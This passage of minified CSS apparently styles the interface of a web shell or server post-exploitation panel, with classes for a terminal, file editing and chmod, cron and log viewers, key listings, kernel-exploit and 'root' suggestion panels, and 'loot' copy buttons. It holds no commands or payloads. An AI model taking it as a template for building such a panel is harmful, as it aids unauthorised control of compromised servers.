14px}.pr1vd4yz-wiz-btn.code-editor-mode{padding:7px 16px;border-radius:8px;font-size:.97em;border:none;cursor:pointer;display:flex;align-items:center;gap:8px;font-family:inherit;outline:0;transition:background .13s,color .13s,border .12s}#pr1vd4yz-file-modal .editor-btn-cancel,.fileedit-btn-cancel,.pr1vd4yz-wiz-btn-light,.pr1vd4yz-wiz-btn-light.code-editor-mode{background:#fff;color:#e53935;border:1.1px solid #fdecec}.pr1vd4yz-lite-off,.pr1vd4yz-lite-on{border-radius:6px;padding:1.5px 7px;font-weight:500}@media (max-width:900px){.pr1vd4yz-db-form-grid{grid-template-columns:1fr}.pr1vd4yz-card-header,.pr1vd4yz-card-section{padding-left:8px;padding-right:8px}.prv-header-bar{flex-direction:column;gap:8px;padding:11px 7px 8px}.prv-menu ul{padding:5px 3px}.pr1vd4yz-modal-wizard.code-editor-mode{max-width:99vw}}.pr1vd4yz-lite-on{color:#10b981;background:#eafff5}.pr1vd4yz-lite-off{color:#ef4444;background:#fff3f3}.pr1vd4yz-lite-badge{font-size:.91em;margin-right:5px;border-radius:7px;border:1px solid #f3f3f3}.pr1vd4yz-lite-row{display:flex;align-items:center;gap:8px;margin-bottom:1.5px}.pr1vd4yz-lite-key{min-width:80px;color:#b0b0b0;font-size:.93em}#pr1vd4yz-file-modal>div{background:#fff;border-radius:18px;box-shadow:0 8px 64px #e5393540,0 0 0 2px #fdecec;max-width:600px;width:97vw;border:1.7px solid #fdecec;display:flex;flex-direction:column;overflow:hidden;animation:.23s cubic-bezier(.21,.92,.44,1.1) popIn}@keyframes popIn{0%{transform:scale(.97) translateY(18px);opacity:0}100%{transform:scale(1) translateY(0);opacity:1}}#pr1vd4yz-file-modal .editor-header{display:flex;align-items:center;gap:16px;border-radius:18px 18px 0 0;padding:18px 24px 12px 22px;background:linear-gradient(90deg,#fff6f6 80%,#fff4f4 100%);border-bottom:1.5px solid #fdecec;position:relative;min-height:41px;box-shadow:0 2px 10px #e5393506}#pr1vd4yz-file-modal .editor-icon{background:linear-gradient(145deg,#e53935 80%,#b71c1c 120%);color:#fff;font-size:1.35em;border-radius:11px;width:38px;height:38px;display:flex;align-items:center;justify-content:center;box-shadow:0 1px 10px #e5393530}#pr1vd4yz-file-modal .editor-title{font-size:1.14em;color:#e53935;letter-spacing:.04em;margin-bottom:1px;text-transform:lowercase;line-height:1.07}#pr1vd4yz-file-modal .editor-path{color:#b71c1c;font-size:.95em;opacity:.81;word-break:break-all;letter-spacing:.01em;margin-top:1.5px;line-height:1.08}#pr1vd4yz-file-modal .editor-close{font-size:1.48em;color:#e53935;background:0 0;border:none;line-height:1;padding:0 10px;border-radius:8px;position:absolute;right:13px;top:10px;transition:background .18s,color .14s;opacity:.94;cursor:pointer}#pr1vd4yz-file-modal .editor-close:hover{color:#fff;background:#e53935;opacity:1}#pr1vd4yz-file-modal form{display:flex;flex-direction:column;padding:0}#pr1vd4yz-file-modal textarea{width:100%;min-height:170px;max-height:54vh;height:33vh;background:linear-gradient(94deg,#fff,#fff9f9 100%);color:#e53935;border:1.3px solid #fdecec;border-radius:10px;font-family:'Fira Mono','Fira Mono';font-size:15px;line-height:1.45;padding:14px 15px;outline:0;resize:vertical;box-shadow:0 2px 16px #e5393512,0 1px 0 #fdecec;margin:21px 22px 0;transition:border .13s,box-shadow .11s,background .11s;overflow:auto;font-weight:450;letter-spacing:.02em}#pr1vd4yz-file-modal textarea:focus{border-color:#e53935;box-shadow:0 0 0 2px #fdecec,0 2px 14px #e5393535;background:#fff6f6;color:#b71c1c}#pr1vd4yz-file-modal .editor-actions{display:flex;justify-content:flex-end;gap:13px;border-top:1.4px solid #fdecec;padding:14px 22px 13px;background:#fff4f4;border-radius:0 0 18px 18px}#pr1vd4yz-file-modal .editor-btn{padding:8px 21px;border-radius:8px;font-size:1.03em;border:none;cursor:pointer;display:flex;align-items:center;gap:8px;font-family:inherit;outline:0;transition:background .13s,color .13s,border .12s,box-shadow .13s;box-shadow:0 1px 7px #e5393520;text-shadow:0 1px 0 #fff4f4}#pr1vd4yz-file-modal .editor-btn-save{background:linear-gradient(92deg,#e53935 60%,#b71c1c 120%);color:#fff;border:1.1px solid #e53935}#pr1vd4yz-file-modal .editor-btn-save:hover{background:#b71c1c;border-color:#b71c1c}@media (max-width:650px){.pr1vd4yz-lite-uname{padding:8px 7px 6px 9px;font-size:.99em}.pr1vd4yz-lite-row{padding:4px 6px;font-size:.95em}.pr1vd4yz-lite-breadcrumb{padding:7px 3px 7px 5px;font-size:.94em}#pr1vd4yz-file-modal>div{max-width:99vw;border-radius:0}#pr1vd4yz-file-modal .editor-header,.editor-actions{padding-left:8px;padding-right:8px}#pr1vd4yz-file-modal textarea{padding:7px 5px;font-size:13px;min-height:80px}}.pr1vd4yz-sym-modal-bg{position:fixed;inset:0;z-index:1111;background:rgba(27,19,24,.13);display:flex;align-items:center;justify-content:center;padding:0}.pr1vd4yz-sym-modal{background:#fff;border-radius:20px;max-width:520px;width:96vw;box-shadow:0 16px 60px #ad145710,0 0 0 2px #fdecec;border:1.7px solid #fdecec;font-family:'Fira Mono',Inter,Arial;display:flex;flex-direction:column;overflow:hidden;margin:0 auto}.pr1vd4yz-sym-header{display:flex;align-items:center;gap:13px;border-radius:20px 20px 0 0;padding:19px 24px 14px;background:#fdf4f8;border-bottom:1.5px solid #f9deed;position:relative;min-height:44px}.pr1vd4yz-sym-icon{background:#ad1457;color:#fff;font-size:1.63em;border-radius:11px;width:43px;height:43px;display:flex;align-items:center;justify-content:center;box-shadow:0 1px 10px #f3c3e7}.pr1vd4yz-sym-title{font-size:1.17em;color:#ad1457;margin-bottom:2px;text-transform:lowercase}.pr1vd4yz-sym-desc{color:#e53935;font-size:.99em;opacity:.89;letter-spacing:.01em}.pr1vd4yz-sym-close{font-size:1.8em;color:#ad1457;background:0 0;border:none;text-decoration:none;line-height:1;padding:0 10px;border-radius:9px;position:absolute;right:16px;top:15px;transition:background .16s,color .14s}.pr1vd4yz-sym-form{display:flex;flex-direction:column;padding:21px 21px 19px;gap:0}.pr1vd4yz-sym-label{color:#ad1457;font-size:1.01em;margin-bottom:8px}.pr1vd4yz-sym-input{font-size:1.06em;border-radius:8px;border:1.3px solid #fdecec;padding:12px;color:#ad1457;background:#fff4f4;margin-bottom:16px;outline:0;width:95%}.pr1vd4yz-sym-input:focus{border-color:#ad1457;box-shadow:0 0 0 2px #fdecec}.pr1vd4yz-sym-btn{background:#ad1457;color:#fff;border:1.2px solid #ad1457;border-radius:7px;padding:9px 0;width:100%;font-size:1.11em;cursor:pointer;margin-bottom:10px;transition:background .13s,color .13s}.pr1vd4yz-sym-result{color:#b71c1c;border-radius:10px;font-size:1.08em;line-height:1.5;max-width:100%;word-break:break-all;overflow-x:auto;box-shadow:0 2px 14px #e5393530}.pr1vd4yz-sym-list{margin:0}.pr1vd4yz-sym-list ul{padding-left:20px;margin:7px 0 0}.pr1vd4yz-sym-list code{font-size:1.06em;background:#fff4f4;color:#ad1457;border-radius:5px;padding:2px 5px}.pr1vd4yz-sym-list li{margin-bottom:2px}@media (max-width:700px){.pr1vd4yz-modal-wizard.code-editor-mode{max-width:100vw;border-radius:0;left:0;transform:none}.pr1vd4yz-modal-actions-wiz.code-editor-mode,.pr1vd4yz-modal-header-wiz.code-editor-mode,.pr1vd4yz-sym-result{padding-left:7px;padding-right:7px}textarea.pr1vd4yz-wiz-editorarea.code-editor-mode{padding:8px 4px;font-size:13px;min-height:120px}.pr1vd4yz-sym-modal{max-width:99vw}.pr1vd4yz-sym-form,.pr1vd4yz-sym-header{padding-left:9px;padding-right:9px}}.ziptool-tabs{margin:0;padding:0;width:100%;background:#fff4f4;border-bottom:1.5px solid #fdecec}.ziptool-tab{flex:1 1 0;background:0 0;border:none;outline:0;padding:14px 0 10px;font-size:1.11em;color:#b71c1c;cursor:pointer;border-radius:0;transition:background .12s,color .12s}.ziptool-tab-active,.ziptool-tab:hover{background:#e5393512;color:#ad1457}.ziptool-tab-content{display:none;width:100%}.ziptool-tab-content-active{display:block}.pr1vd4yz-sym-result{min-height:0;padding:0;box-shadow:none;background:0 0;margin:6px 0 0}.pr1vd4yz-terminal-neo-bg{position:fixed;inset:0;z-index:3000;background:rgba(255,0,0,.08);display:flex;align-items:center;justify-content:center}.pr1vd4yz-terminal-neo-modal{background:#fff;border-radius:18px;box-shadow:0 22px 66px 0 #e5393522,0 0 0 2px #fdecec;max-width:700px;width:99vw;min-width:0;padding:0;display:flex;flex-direction:column;overflow:hidden}.pr1vd4yz-terminal-neo-header{background:#f4f7fb;padding:21px 26px 15px 22px;display:flex;align-items:center;gap:16px;border-radius:18px 18px 0 0;border-bottom:1.7px solid #fdecec;position:relative;min-height:48px}.pr1vd4yz-terminal-neo-title{font-size:1.19em;color:#e53935;letter-spacing:.03em;text-transform:lowercase}.pr1vd4yz-terminal-neo-led{width:18px;height:18px;border-radius:100px;background:radial-gradient(circle at 60% 40%,#13de87 85%,#e5fbe5 100%);border:2px solid #16a34a;box-shadow:0 0 4px #13de87}.pr1vd4yz-terminal-neo-close{font-size:2.1em;color:#e53935;background:0 0;border:none;padding:0 13px;border-radius:8px;margin-left:auto;cursor:pointer;transition:background .16s,color .13s}.pr1vd4yz-terminal-neo-form{width:100%;display:flex;flex-direction:column}.pr1vd4yz-terminal-neo-outwrap{background:#131519;border-bottom:1.7px solid #fdecec;padding:0}.pr1vd4yz-terminal-neo-output{width:100%;min-height:270px;max-height:44vh;height:32vh;background:#131519;color:#19b394;font-family:'Fira Mono';font-size:14.1px;line-height:1.52;border:none;outline:0;resize:vertical;border-radius:0;padding:18px 18px 10px;box-shadow:0 2px 6px #0a4eaa0b;margin:0}.pr1vd4yz-terminal-neo-inputline{display:flex;align-items:center;gap:10px;padding:17px 22px 16px 18px;background:#fff;border-radius:0 0 18px 18px}.pr1vd4yz-terminal-neo-prompt{color:#e53935;font-family:'Fira Mono',monospace;font-size:1.1em;padding-right:2px}.pr1vd4yz-terminal-neo-input{flex:1;background:#f4f7fb;border:1.3px solid #fdecec;border-radius:7px;padding:10px 15px;font-size:1.07em;font-family:'Fira Mono',monospace;outline:0;transition:border .14s}.pr1vd4yz-cronmodal-code,.pr1vd4yz-search-row{font-family:'Fira Mono';overflow-x:auto;word-break:break-all}.pr1vd4yz-terminal-neo-send{background:#10b981;color:#fff;border:none;padding:10px 22px;border-radius:7px;font-size:1.13em;margin-left:2px;transition:background .13s;cursor:pointer}.pr1vd4yz-terminal-neo-send:hover{background:#0a4eaa;color:#fff}.pr1vd4yz-file-perm{display:inline-flex;align-items:center;font-size:1.04em;padding:5px 13px 5px 11px;width:130px;border-radius:8px;letter-spacing:.04em;gap:8px}.pr1vd4yz-perm-icon{font-size:1.07em;margin-right:5px}.pr1vd4yz-perm-green{color:#16a34a}.pr1vd4yz-file-perm.pr1vd4yz-file-writable{background:#ecfdf5;color:#16a34a;border:1px solid #bbf7d0}.pr1vd4yz-file-perm.pr1vd4yz-file-readonly{background:#fbeaea;color:#e53935;border:1px solid #fecaca}.pr1vd4yz-file-size-badge{display:inline-flex;align-items:center;gap:6px;background:#fff4f4;color:#e53935;border-radius:7px;padding:5px 13px 5px 10px;font-size:13px;border:1.3px solid #fdecec;letter-spacing:.01em;transition:background .12s,color .12s;box-shadow:0 1px 8px #e5393516}.pr1vd4yz-file-size-badge:hover{background:#ffe2e2;color:#b71c1c;border-color:#fbc8c8}.pr1vd4yz-size-icon{color:#e53935;font-size:1.1em;margin-right:4px;opacity:.88}.pr1vd4yz-file-col.pr1vd4yz-file-actions a{display:inline-flex;align-items:center;justify-content:center;background:#fff4f4;border-radius:7px;border:1.1px solid #fdecec;font-size:1.14em;padding:7px 10px;color:#e53935;box-shadow:0 1px 9px #e5393514;transition:background .14s,color .13s,box-shadow .12s}.pr1vd4yz-file-actions a[title=Rename]{color:#1a1a1a;background:#e7f1fa;border-color:#bbdefb}.pr1vd4yz-file-actions a[title=Chmod]{color:#fbbf24;background:#fffbe8;border-color:#fef6cc}.pr1vd4yz-file-actions a[title=Delete]{color:#e53935;background:#fff4f4;border-color:#fdecec}.pr1vd4yz-file-actions a[title=Download]{color:#10b981;background:#ecfdf5;border-color:#bbf7d0}.pr1vd4yz-file-actions a:hover{box-shadow:0 4px 22px #e5393525;filter:brightness(1.08);border-color:#e53935;color:#fff;background:#e53935}.pr1vd4yz-file-actions a[title=Download]:hover{background:#10b981;color:#fff;border-color:#0d9e74}.pr1vd4yz-file-actions a[title=Rename]:hover{background:#1a1a1a;color:#fff;border-color:#1566b7}.pr1vd4yz-file-actions a[title=Chmod]:hover{background:#fbbf24;color:#fff;border-color:#fbbf24}.pr1vd4yz-cronmodal-box{background:#fff4f4;border-radius:14px;padding:13px 12px;max-height:330px;min-height:110px;overflow-y:auto;margin:0 5px 8px;box-shadow:0 2px 18px #e5393517}.pr1vd4yz-cronmodal-section,.pr1vd4yz-searchmodal-section{margin-bottom:8px}.pr1vd4yz-cronmodal-root{color:#e53935;font-size:1.08em;margin-bottom:4px;margin-top:0;letter-spacing:.03em}.pr1vd4yz-cronmodal-user{color:#1a1a1a;font-size:1.05em;margin-top:15px;margin-bottom:3px;letter-spacing:.01em}.pr1vd4yz-cronmodal-code{background:#fff;color:#1a1d1d;border-radius:8px;padding:8px 10px;font-size:.97em;line-height:1.64;margin-bottom:0;white-space:pre;border:1px solid #fdecec;box-shadow:0 1px 7px #e5393510}.pr1vd4yz-searchmodal-box{background:#fff4f4;border-radius:14px;padding:12px 11px 10px;max-height:320px;min-height:100px;overflow-y:auto;margin:0 5px 8px;box-shadow:0 2px 18px #e5393516;font-size:13px}.pr1vd4yz-search-file{color:#1a1a1a;margin-top:10px;margin-bottom:2px;font-size:font-size: 13px}.pr1vd4yz-search-row{background:#fff;border-radius:7px;padding:7px 10px;margin-bottom:6px;font-size:.97em;line-height:1.52;color:#232324;box-shadow:0 1px 7px #e5393510;border:1px solid #fdecec}.pr1vd4yz-search-ico{margin-right:7px}.pr1vd4yz-wafmodal{background:#fff4f4;border-radius:16px;padding:17px 13px 13px;max-width:470px;width:97vw;margin:0 auto 12px;box-shadow:0 2px 18px #e5393517;font-size:1.09em}.pr1vd4yz-waf-form{width:100%;display:flex;flex-direction:column;gap:8px}.pr1vd4yz-waf-inp{width:95%;font-size:1.11em;padding:14px 11px;border:1.1px solid #fdecec;border-radius:8px;outline:0;background:#fff;color:#e53935;transition:border .14s;margin-bottom:0}.pr1vd4yz-waf-btn{width:100%;font-size:1.11em;padding:11px 0;background:#e53935;border:1.2px solid #e53935;color:#fff;border-radius:8px;margin-top:0;cursor:pointer;transition:background .16s}.fileedit-btn-save:hover,.pr1vd4yz-apibtn:hover,.pr1vd4yz-httpreq-btn:hover,.pr1vd4yz-keybtn:hover,.pr1vd4yz-logbtn:hover,.pr1vd4yz-waf-btn:hover{background:#b71c1c}.pr1vd4yz-waf-resultbox{width:95%;background:#fff;margin-top:13px;padding:11px 10px;border-radius:10px;min-height:44px;box-shadow:0 2px 8px #e5393511;border:1.2px solid #fdecec;font-size:1.07em;display:flex;flex-direction:column;gap:9px}.pr1vd4yz-waf-row{display:flex;align-items:center;background:#fff4f4;border-radius:7px;padding:8px 12px;border:1px solid #fdecec;color:#b71c1c;gap:8px}.pr1vd4yz-wafbadge{border-radius:7px;font-size:.95em;padding:2px 10px;margin-left:7px}.pr1vd4yz-badge-ok{background:#d4f6e4;color:#00bb72}.pr1vd4yz-badge-alert{background:#ffe0e0;color:#e53935}@media (max-width:600px){.pr1vd4yz-modal-wizard{padding-bottom:10px}.pr1vd4yz-modal-actions-wiz,.pr1vd4yz-modal-header-wiz,.pr1vd4yz-wiz-section{padding-left:5px;padding-right:5px}.pr1vd4yz-wiz-section{gap:4px}.pr1vd4yz-term-form,.pr1vd4yz-term-header,.pr1vd4yz-term-screen{margin-left:2px;margin-right:2px}.pr1vd4yz-term-title{font-size:font-size: 13px}.pr1vd4yz-term-form{font-size:.96em}.prv-menu ul{flex-wrap:wrap;font-size:.95em;gap:1px}.pr1vd4yz-waf-btn,.pr1vd4yz-waf-inp,.prv-logo{font-size:1em}.prv-act-btn,.prv-act-btn-green{padding:5px 9px;font-size:.95em}.prv-chip{padding:6px 9px 6px 7px}.pr1vd4yz-cronmodal-box{max-height:150px;font-size:.92em}.pr1vd4yz-cronmodal-code{font-size:.93em}.pr1vd4yz-wafmodal{max-width:100vw;font-size:.98em}}.pr1vd4yz-modal-bg{position:fixed;inset:0;z-index:13337;display:flex;align-items:center;justify-content:center;padding:0;pointer-events:auto}.pr1vd4yz-modal-wizard{border-radius:17px;max-width:560px;width:97vw;min-width:0;max-height:88vh;padding:0;border:1.7px solid #fdecec;font-family:'Fira Mono' position: relative;display:flex;flex-direction:column;overflow:hidden}.pr1vd4yz-modal-header-wiz{display:flex;align-items:center;gap:13px;border-radius:17px 17px 0 0;padding:18px 22px 11px;border-bottom:1.5px solid #e5e9ef;position:relative;min-height:44px}.pr1vd4yz-wiz-icon{color:#fff;font-size:1.45em;border-radius:11px;width:39px;height:39px;display:flex;align-items:center;justify-content:center;box-shadow:0 1px 10px #ff9b9b}.pr1vd4yz-wiz-title{font-size:1.1em;color:#e53935;letter-spacing:.04em;margin-bottom:2px;text-transform:lowercase}.pr1vd4yz-wiz-desc{color:#1a1a1a;font-size:.97em;font-weight:400;opacity:.87;letter-spacing:.01em;max-width:350px;overflow-x:auto}.pr1vd4yz-modal-close-wiz{font-size:1.7em;color:#b71c1c;background:0 0;border:none;text-decoration:none;line-height:1;padding:0 10px;border-radius:9px;position:absolute;right:13px;top:11px;transition:background .15s,color .13s}.pr1vd4yz-httpreq-modal{background:#fff;padding:18px 17px 10px;font-size:1.09em;flex:1 1 0;display:flex;flex-direction:column;gap:0}.pr1vd4yz-httpreq-form,.pzcard-form{display:flex;flex-direction:column;gap:8px}.pr1vd4yz-httpreq-inp,.pr1vd4yz-httpreq-select,.pr1vd4yz-httpreq-tarea{width:95%;font-size:1.09em;padding:12px 9px;border:1.1px solid #fdecec;border-radius:8px;background:#fff;color:#e53935;outline:0;margin-bottom:0;font-family:inherit;transition:border .14s}.pr1vd4yz-httpreq-btn{width:100%;font-size:1.09em;padding:12px 0;background:#e53935;border:1.2px solid #e53935;color:#fff;border-radius:8px;margin-top:0;cursor:pointer;transition:background .16s}.pr1vd4yz-httpreq-resultbox{width:95%;background:#fff;margin-top:13px;padding:10px 11px 14px;border-radius:10px;box-shadow:0 2px 8px #e5393513;border:1.2px solid #fdecec;font-size:1.07em;display:flex;flex-direction:column;gap:9px}.pr1vd4yz-httpreq-row{background:#fff4f4;border-radius:7px;padding:8px 10px;border:1px solid #fdecec;color:#b71c1c;margin-bottom:5px;font-size:1em;word-break:break-all}.pr1vd4yz-modal-actions-wiz{display:flex;justify-content:flex-end;gap:10px;border-top:1.5px solid #e5e9ef;padding:13px 22px 12px;margin-top:0}.pr1vd4yz-wiz-btn{padding:7px 16px;border-radius:8px;font-size:.97em;border:none;cursor:pointer;transition:background .13s,color .13s,border .12s;display:flex;align-items:center;gap:8px;outline:0;text-decoration:none;font-family:inherit}@media (max-width:900px){.pr1vd4yz-modal-wizard{max-width:99vw}}@media (max-width:700px){.pr1vd4yz-terminal-neo-modal{max-width:99vw;border-radius:0}.pr1vd4yz-terminal-neo-header,.pr1vd4yz-terminal-neo-inputline{padding-left:8px;padding-right:8px}.pr1vd4yz-terminal-neo-output{font-size:13px;min-height:100px}.pr1vd4yz-searchmodal-box{max-height:120px;font-size:.93em}.pr1vd4yz-search-row{font-size:.94em}.pr1vd4yz-modal-wizard{max-width:100vw;border-radius:0;left:0;transform:none}.pr1vd4yz-modal-actions-wiz,.pr1vd4yz-modal-header-wiz{padding-left:7px;padding-right:7px}.pr1vd4yz-httpreq-modal{padding:13px 2px 8px}.pr1vd4yz-httpreq-inp,.pr1vd4yz-httpreq-select,.pr1vd4yz-httpreq-tarea{font-size:.97em;padding:10px 4px}}.pr1vd4yz-kernel-modal{background:#fff4f4;border-radius:15px;padding:17px 13px 16px;max-width:430px;margin:0 auto 15px;box-shadow:0 2px 18px #e5393519;font-size:1.09em}.pr1vd4yz-kernelresult{width:100%;margin-top:13px;padding:8px 7px;border-radius:8px;display:flex;flex-direction:column;gap:10px}.pr1vd4yz-krow{background:#fff;border-radius:7px;padding:8px 11px 7px;border:1px solid #fdecec;margin-bottom:.4em}.pr1vd4yz-kbadge{display:inline-block;margin-left:8px;padding:2px 10px;border-radius:6px;font-size:.93em;background:#e5393540;color:#e53935;vertical-align:middle}.pr1vd4yz-kbadge-red,.pr1vd4yz-root-copy:hover,.pr1vd4yz-root-link:hover,.pzloot-copy:hover{background:#e53935;color:#fff}.pr1vd4yz-kbadge-orange{background:#fb923c;color:#fff}@media(max-width:650px){.pr1vd4yz-kernel-modal{max-width:99vw;font-size:.98em}}.pr1vd4yz-apimodal{background:#fff;border-radius:14px;box-shadow:0 2px 24px #e5393530;padding:19px 14px 18px;max-width:480px;margin:0 auto 15px;border:1.5px solid #fdecec}.pr1vd4yz-apilistbox{width:100%;margin-top:7px;display:flex;flex-direction:column;gap:13px}.pr1vd4yz-apirow{background:#fff7f7;border-radius:8px;padding:9px 12px;border:1px solid #fdecec;font-size:1.08em;color:#e53935}.pr1vd4yz-apiul{margin:5px 0 0;padding:0 0 0 17px;list-style:square}.pr1vd4yz-apihit{color:#e53935;background:#fdecec;display:inline-block;margin-bottom:2px;padding:2px 7px;border-radius:5px;font-family:'Fira Mono';font-size:.98em}.pr1vd4yz-apiform{margin-bottom:14px;display:flex;gap:7px}.pr1vd4yz-apipath{flex:1 1 0;background:#fff;border:1.2px solid #fdecec;border-radius:7px;padding:8px 11px;font-size:1em;color:#e53935;font-family:'Fira Mono';width:400px}.pr1vd4yz-apibtn{background:#e53935;color:#fff;border:none;border-radius:8px;padding:8px 17px;font-size:1em;transition:background .13s;letter-spacing:.01em}@media(max-width:520px){.pr1vd4yz-apimodal{max-width:99vw}.pr1vd4yz-apiform{flex-direction:column;gap:6px}}.pr1vd4yz-logmodal{background:#fff;border-radius:13px;box-shadow:0 2px 22px #e5393533;padding:19px 16px 18px;max-width:470px;margin:0 auto 15px;border:1.5px solid #fdecec;max-height:76vh;overflow:hidden;display:flex;flex-direction:column}.pr1vd4yz-keylist,.pr1vd4yz-loglist{overflow-y:auto;min-height:30px;width:100%}.pr1vd4yz-loglist{margin-top:6px;display:flex;flex-direction:column;gap:13px;max-height:54vh;border-radius:6px}.pr1vd4yz-logrow{background:#fff7f7;border-radius:8px;padding:8px 12px 9px;border:1px solid #fdecec;font-size:1.08em;display:flex;align-items:center;gap:8px}.pr1vd4yz-keysize,.pr1vd4yz-logsize{font-size:.94em;color:#e53935;background:#fdecec;padding:2px 8px;border-radius:7px;font-family:'Fira Mono';margin-right:9px}.pr1vd4yz-keybtn,.pr1vd4yz-logbtn{color:#fff;transition:background .13s;outline:0;cursor:pointer}.pr1vd4yz-logbtn{background:#e53935;border:none;border-radius:8px;padding:7px 14px 7px 11px;font-size:.98em;display:inline-flex;align-items:center;gap:7px}.pr1vd4yz-keymodal{background:#fff;border-radius:13px;box-shadow:0 2px 22px #e5393533;padding:19px 16px 18px;max-width:470px;margin:0 auto 15px;border:1.5px solid #fdecec;max-height:77vh;display:flex;flex-direction:column}.pr1vd4yz-keylist{margin-top:7px;display:flex;flex-direction:column;gap:10px;max-height:46vh;border-radius:6px}.pr1vd4yz-keyrow{background:#fff7f7;border-radius:8px;padding:8px 12px 9px;border:1px solid #fdecec;font-size:1.06em;display:flex;align-items:center;gap:7px}.pr1vd4yz-keybtn{background:#e53935;border:none;border-radius:8px;padding:7px 14px 7px 11px;font-size:.97em;display:inline-flex;align-items:center;gap:7px}.pr1vd4yz-keybox{background:#fffbe9;border:1px solid #fdecec;border-radius:7px;margin:10px 0 5px;padding:12px 14px}.pr1vd4yz-keyarea{width:100%;min-height:85px;background:#fff;color:#e53935;border:1.1px solid #fdecec;border-radius:6px;font-family:'Fira Mono';font-size:13px;line-height:1.4;padding:8px 9px;resize:vertical;margin-top:7px}.pr1vd4yz-keycopy{background:#fdecec;color:#e53935;border:none;border-radius:7px;padding:4px 17px;margin-top:7px;cursor:pointer;font-size:.96em}@media(max-width:540px){.pr1vd4yz-logmodal{max-width:98vw;max-height:94vh}.pr1vd4yz-loglist{max-height:64vh}.pr1vd4yz-keymodal{max-width:99vw;max-height:90vh}}.pr1vd4yz-root-modal{background:#fff;border-radius:15px;box-shadow:0 4px 40px #e5393533;max-width:530px;margin:32px auto;border:1.9px solid #fdecec;padding:0;max-height:82vh;display:flex;flex-direction:column;overflow:hidden;font-family:'JetBrains Mono','Fira Mono',monospace}.pr1vd4yz-root-header{background:#fff4f4;border-bottom:1.5px solid #fdecec;border-radius:15px 15px 0 0;padding:21px 24px 9px;display:flex;gap:12px;align-items:center;min-height:49px}.pr1vd4yz-root-ico{background:#e53935;color:#fff;font-size:1.34em;border-radius:10px;width:43px;height:43px;display:flex;align-items:center;justify-content:center;box-shadow:0 1px 12px #e5393530}.pr1vd4yz-root-desc{font-size:.98em;color:#c4453e;opacity:.92}.pr1vd4yz-root-close{font-size:1.8em;color:#b71c1c;background:0 0;border:none;padding:0 9px;border-radius:8px;position:absolute;right:16px;top:17px}.pr1vd4yz-root-content{padding:17px 22px 19px;overflow-y:auto;flex:1}.pr1vd4yz-root-list{display:flex;flex-direction:column;gap:17px}.pr1vd4yz-root-box{background:#fff7f7;border-radius:8px;padding:13px 17px 13px 14px;border:1px solid #fdecec;display:flex;flex-direction:column;gap:4px;position:relative}.pr1vd4yz-root-box-title{font-size:1.01em;color:#e53935;display:flex;align-items:center;gap:7px;margin-bottom:4px}.pr1vd4yz-root-box-desc{font-size:.98em;color:#8b3131;opacity:.98}.pr1vd4yz-root-copy,.pr1vd4yz-root-link{background:#fdecec;color:#e53935;cursor:pointer;font-size:.94em}.pr1vd4yz-root-link{margin-left:5px;border:none;border-radius:5px;padding:2px 13px}.pr1vd4yz-root-copy{margin-left:4px;border:none;border-radius:5px;padding:2px 11px}.pr1vd4yz-root-badge-2025,.pr1vd4yz-root-badge-ai{padding:2.5px 13px;border-radius:12px;font-size:.91em;margin-left:9px}.pr1vd4yz-root-badge-ai{background:#e53935;color:#fff;letter-spacing:.07em;box-shadow:0 0 5px #e5393545}.pr1vd4yz-root-badge-2025{background:#fdecec;color:#e53935;letter-spacing:.06em}.prv-header{width:100%;background:#fff;box-shadow:0 6px 34px #e539351a}.prv-header-bar{display:flex;align-items:center;justify-content:space-between;padding:12px 22px}.prv-logo{display:flex;align-items:center;gap:7px}.prv-logo-dot,.prv-logo-led{width:8px;height:8px;border-radius:50%;background:#e53935;box-shadow:0 0 8px #e5393555}.prv-logo-txt{color:#e53935;font-size:1.17em;letter-spacing:.04em}.prv-ver{font-size:.83em;margin-left:2px}.prv-actions{display:flex;gap:9px}.prv-act-btn{background:#fff;border:1.1px solid #fdecec;color:#e53935;padding:7px 12px;border-radius:8px;transition:.13s;font-size:1.13em;display:inline-flex;align-items:center}.prv-upload{display:flex;gap:5px}.prv-upload-form{display:flex;align-items:center;gap:0}.prv-menu{width:100%;margin:0;padding:0}.prv-menu-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(125px,1fr));gap:6px;padding:11px 16px 6px;background:#f6f7fa;border-bottom:1.7px solid #fdecec;border-top:1.7px solid #fdecec;margin:0;overflow-x:auto;font-size:1em;list-style:none}.prv-chip,.prv-header2-bar{display:flex;align-items:center}.prv-chip{gap:6px;background:#fff;color:#e53935;border-radius:7px;padding:8px 10px;font-size:11px border:1.1px solid #fdecec;transition:background .11s,border .11s,color .12s;box-shadow:0 1px 6px #e539351a;min-width:0;text-decoration:none}.prv-chip i{min-width:19px;font-size:1.08em}.prv-chip span{white-space:nowrap}.prv-badge-dot{display:inline-block;width:6px;height:6px;border-radius:3px;background:#e53935;margin-left:4px}.prv-chip-mini{font-size:.85em;background:#fdecec;color:#e53935;padding:1px 6px;border-radius:6px;margin-left:5px}.prv-header2{width:100%;background:#fff;box-shadow:0 8px 32px #e5393520;border-bottom:2px solid #fdecec}.prv-header2-bar{justify-content:space-between;padding:19px 26px 12px;gap:18px;flex-wrap:wrap}.prv-header2-btn,.prv-logo2{align-items:center;display:flex}.prv-logo2{gap:12px;font-size:1.37em}.prv-logo2-dot,.prv-logo2-led{width:13px;height:13px;border-radius:50%;background:linear-gradient(120deg,#e53935 65%,#ffe6e6 100%);box-shadow:0 0 14px #e5393550;animation:1.7s infinite alternate blink}@keyframes blink{0%{opacity:.7}100%{opacity:1}}.prv-ver2{font-size:.78em;margin-left:3px}.prv-header2-actions{display:flex;gap:13px;flex-wrap:wrap;align-items:center}.prv-header2-btn{gap:7px;background:#fff;border:1.6px solid #fdecec;color:#e53935;padding:9px 17px;border-radius:10px;font-size:11px;letter-spacing:.01em;cursor:pointer;box-shadow:0 2px 11px #e5393520;transition:.14s}.prv-header2-btn-green:hover,.prv-header2-btn:hover{background:#fdecec;color:#b71c1c;border-color:#e53935}.prv-header2-btn i{font-size:1.17em}.prv-header2-upload{display:flex;align-items:center;gap:4px;margin-left:7px}.pr1vd4yz-ex-chain-bg{position:fixed;inset:0;z-index:13339;background:rgba(229,57,53,.13);display:flex;align-items:center;justify-content:center}.pr1vd4yz-ex-chain-modal{background:#fff;border-radius:15px;box-shadow:0 6px 60px #e5393533;max-width:680px;width:99vw;border:1.6px solid #fdecec;display:flex;flex-direction:column;overflow:hidden}.pr1vd4yz-ex-chain-header{background:#fff4f4;padding:15px 20px 8px;display:flex;gap:11px;align-items:center;border-bottom:1.4px solid 